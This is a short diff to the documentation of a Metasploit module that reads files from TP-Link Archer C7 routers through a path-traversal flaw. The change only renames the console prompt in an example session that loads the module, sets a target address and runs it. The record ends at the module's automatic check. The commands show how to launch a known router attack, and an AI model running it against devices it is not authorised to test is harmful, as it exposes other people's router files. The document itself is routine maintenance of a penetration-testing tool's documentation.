@@ -25,10 +25,10 @@ Use this option to save the file found as loot
 ### Archer C7_V1_141204_US
 
 ```
-msf6 > use auxiliary/gather/tplink_archer_c7_traversal
-msf6 auxiliary(gather/tplink_archer_c7_traversal) > set rhosts 192.168.0.1
+msf > use auxiliary/gather/tplink_archer_c7_traversal
+msf auxiliary(gather/tplink_archer_c7_traversal) > set rhosts 192.168.0.1
 rhosts => 192.168.0.1
-msf6 auxiliary(gather/tplink_archer_c7_traversal) > run
+msf auxiliary(gather/tplink_archer_c7_traversal) > run
 [*] Running module against 192.168.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
